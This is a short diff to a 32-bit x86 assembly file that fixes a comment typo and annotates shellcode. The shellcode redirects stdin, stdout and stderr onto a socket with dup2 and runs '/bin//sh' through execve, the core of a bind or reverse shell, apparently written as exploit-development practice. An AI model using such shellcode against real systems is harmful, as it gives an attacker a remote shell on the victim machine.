@@ -89,7 +89,7 @@ section .text
 
 		xchg ebx, esi		; old sockfd in ebx for dup2		
 		;********************************************************************************;
-		; Redirect srdin, stdout, stderr with sys_dup2
+		; Redirect stdin, stdout, stderr with sys_dup2
 		; int dup2(int oldfd, int newfd);
 		; sys_dup2 = 0x3f
 
@@ -110,12 +110,12 @@ section .text
 		push eax		; push null onto stack
 		mov al, 0x0b
 		
-		push 0x68732f2f
-		push 0x6e69622f
+		push 0x68732f2f		; hs//
+		push 0x6e69622f		; nib/
 
-		mov ebx, esp
-		xor ecx, ecx
-		xor edx, edx
+		mov ebx, esp		; ebx = pointer to /bin//sh string
+		xor ecx, ecx		; ecx = 0
+		xor edx, edx		; edx = 0
 
 		int 0x80
 
